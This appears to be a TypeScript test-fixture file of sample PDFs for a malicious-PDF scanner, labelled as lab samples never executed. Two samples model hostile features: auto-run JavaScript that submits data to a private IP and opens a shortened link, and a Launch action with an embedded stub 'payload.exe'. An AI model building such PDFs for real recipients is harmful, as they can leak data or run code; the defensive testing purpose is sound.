/** Muestras de laboratorio. No se ejecutan: solo se leen como texto. */

export const PDF_CLEAN_INVOICE = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 68 >>
stream
BT /F1 12 Tf 72 720 Td (Factura 2026-884 Northline. Importe 1.240 EUR) Tj ET
endstream
endobj
trailer
<< /Root 1 0 R >>
%%EOF
`;

export const PDF_WITH_JS_AND_OPEN = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('verificar'); this.submitForm('http://192.168.8.22/collect')) >> /Names << /JavaScript 5 0 R >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /AA << /O << /S /JavaScript /JS (app.launchURL('http://bit.ly/pay-now')) >> >> >>
endobj
5 0 obj
<< /Names [(init) << /S /JavaScript /JS (var x = 1) >> ] >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
`;

export const PDF_EMBEDDED_AND_LAUNCH = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 6 0 R >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Annots [4 0 R] >>
endobj
4 0 obj
<< /Type /Annot /Subtype /Link /A << /S /Launch /F (update.exe) >> >>
endobj
6 0 obj
<< /Names [(payload.exe) << /Type /Filespec /EF << /F 7 0 R >> /F (payload.exe) >> ] >>
endobj
7 0 obj
<< /Type /EmbeddedFile /Length 12 >>
stream
MZ............
endstream
endobj
trailer
<< /Root 1 0 R >>
%%EOF
`;

export const PDF_FORM_WITH_URLS = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [] >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Annots [4 0 R] >>
endobj
4 0 obj
<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://northline.es/clientes/factura/884) >> >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
`;
